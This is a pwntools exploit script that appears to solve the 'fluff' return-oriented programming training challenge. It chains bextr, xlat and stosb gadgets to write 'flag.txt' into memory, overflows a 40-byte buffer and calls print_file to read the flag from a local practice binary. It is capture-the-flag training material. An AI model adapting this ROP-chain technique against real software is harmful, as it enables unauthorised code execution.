#!/usr/bin/env python3

from pwn import *

exe = "./fluff"
context.binary = elf = ELF(exe, checksec=False)
rop = ROP(elf)
io = process(exe)

ret = rop.find_gadget(['ret'])

pop_rdi = rop.find_gadget(['pop rdi'])[0]

bextr = elf.sym.questionableGadgets+2
stos = elf.sym.questionableGadgets+17
xlat = elf.sym.questionableGadgets

flag = b"flag.txt"
data = elf.sym.data_start

current_rax = 0xb
offset = 40

for i, char in enumerate(flag):
	if(i != 0):
		current_rax = flag[i -1]
	
	char_addr = hex(read(exe).find(char) + elf.address)
	
	char_addr = int(char_addr,16) - current_rax - 0x3ef2
	
	rop.raw([bextr,
	0x4000,
	char_addr,
	xlat,
	pop_rdi,
	data+i,
	stos])

rop.print_file(data)

io.sendlineafter(b"> ", flat({ offset : rop.chain()}))

print(io.recvall())

